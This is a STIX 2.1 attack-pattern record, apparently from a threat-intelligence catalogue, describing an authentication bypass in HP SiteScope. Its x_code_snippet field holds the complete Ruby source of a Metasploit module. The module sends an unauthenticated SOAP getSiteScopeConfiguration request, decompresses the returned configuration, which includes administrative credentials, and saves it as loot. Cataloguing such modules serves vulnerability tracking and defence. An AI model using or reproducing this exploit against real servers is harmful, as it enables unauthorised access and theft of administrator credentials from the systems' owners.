{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68a8cc5f-78f9-4413-b447-6aa54de825b2",
    "created": "2024-08-14T16:30:41.751838Z",
    "modified": "2024-08-14T16:30:41.751842Z",
    "name": "HP SiteScope SOAP Call getSiteScopeConfiguration Configuration Access",
    "description": " This module exploits an authentication bypass vulnerability in HP SiteScope which allows to retrieve the HP SiteScope configuration, including administrative credentials. It is accomplished by calling the getSiteScopeConfiguration operation available through the APISiteScopeImpl AXIS service. The HP SiteScope Configuration is retrieved as file containing Java serialization data. This module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos 6.3.  'References'   => [ [ 'OSVDB', '85120' ] [ 'BID', '55269' ] [ 'ZDI', '12-173' ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_sitescope_getsitescopeconfiguration.rb",
            "external_id": "hp_sitescope_getsitescopeconfiguration.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'HP SiteScope SOAP Call getSiteScopeConfiguration Configuration Access',\n      'Description'  =>  %q{\n          This module exploits an authentication bypass vulnerability in HP SiteScope\n        which allows to retrieve the HP SiteScope configuration, including administrative\n        credentials. It is accomplished by calling the getSiteScopeConfiguration operation\n        available through the APISiteScopeImpl AXIS service. The HP SiteScope Configuration\n        is retrieved as file containing Java serialization data. This module has been\n        tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos\n        6.3.\n      },\n      'References'   =>\n        [\n          [ 'OSVDB', '85120' ],\n          [ 'BID', '55269' ],\n          [ 'ZDI', '12-173' ]\n        ],\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])\n    ])\n\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def run_host(ip)\n    @uri = normalize_uri(target_uri.path)\n    @uri << '/' if @uri[-1,1] != '/'\n\n    print_status(\"Connecting to SiteScope SOAP Interface\")\n\n    uri = normalize_uri(@uri, 'services/APISiteScopeImpl')\n\n    res = send_request_cgi({\n      'uri'     => uri,\n      'method'  => 'GET'})\n\n    if not res\n      print_error(\"Unable to connect\")\n      return\n    end\n\n    access_configuration\n  end\n\n  def access_configuration\n\n    data = \"<?xml version='1.0' encoding='UTF-8'?>\" + \"\\r\\n\"\n    data << \"<wsns0:Envelope\" + \"\\r\\n\"\n    data << \"xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"xmlns:xsd='http://www.w3.org/2001/XMLSchema'\" + \"\\r\\n\"\n    data << \"xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<wsns0:Body\" + \"\\r\\n\"\n    data << \"wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<impl:getSiteScopeConfiguration\" + \"\\r\\n\"\n    data << \"xmlns:impl='http://Api.freshtech.COM'\" + \"\\r\\n\"\n    data << \"></impl:getSiteScopeConfiguration>\" + \"\\r\\n\"\n    data << \"</wsns0:Body>\" + \"\\r\\n\"\n    data << \"</wsns0:Envelope>\"\n\n    print_status(\"Retrieving the SiteScope Configuration\")\n\n    uri = normalize_uri(@uri, 'services/APISiteScopeImpl')\n\n    res = send_request_cgi({\n      'uri'      => uri,\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => data,\n      'headers'  => {\n        'SOAPAction'    => '\"\"',\n    }})\n\n    if res and res.code == 200\n\n      if res.headers['Content-Type'] =~ /boundary=\"(.*)\"/\n        boundary = $1\n      end\n      if not boundary or boundary.empty?\n        print_error(\"Failed to retrieve the SiteScope Configuration\")\n        return\n      end\n\n      if res.body =~ /getSiteScopeConfigurationReturn href=\"cid:([A-F0-9]*)\"/\n        cid = $1\n      end\n      if not cid or cid.empty?\n        print_error(\"Failed to retrieve the SiteScope Configuration\")\n        return\n      end\n\n      if res.body =~ /#{cid}>\\r\\n\\r\\n(.*)\\r\\n--#{boundary}/m\n        loot = Rex::Text.ungzip($1)\n      end\n      if not loot or loot.empty?\n        print_error(\"Failed to retrieve the SiteScope Configuration\")\n        return\n      end\n\n      path = store_loot('hp.sitescope.configuration', 'application/octet-stream', rhost, loot, cid, \"#{rhost} HP SiteScope Configuration\")\n      print_good(\"HP SiteScope Configuration saved in #{path}\")\n      print_status(\"HP SiteScope Configuration is saved as Java serialization data\")\n      return\n    end\n\n    print_error(\"Failed to retrieve the SiteScope Configuration\")\n  end\nend\n\n"
}